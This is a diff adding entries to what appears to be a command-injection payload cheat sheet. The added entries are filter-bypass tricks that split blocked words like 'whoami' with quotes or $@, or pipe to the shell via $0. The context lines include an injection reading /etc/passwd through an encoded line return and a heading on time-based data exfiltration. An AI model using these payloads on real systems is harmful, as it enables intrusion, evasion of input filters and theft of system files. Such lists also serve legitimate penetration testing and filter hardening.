@@ -67,6 +67,29 @@ Commands execution with a line return
 something%0Acat%20/etc/passwd
 ```
 
+Bypass blacklisted word with single quote
+```
+w'h'o'am'i
+```
+
+Bypass blacklisted word with double quote
+```
+w"h"o"am"i
+```
+
+Bypass blacklisted word with $@
+```
+who$@ami
+```
+
+Bypass zsh/bash/sh blacklist
+```
+echo $0
+-> /usr/bin/zsh
+echo whoami|$0
+```
+
+
 ## Time based data exfiltration
 Extracting data : char by char
 ```
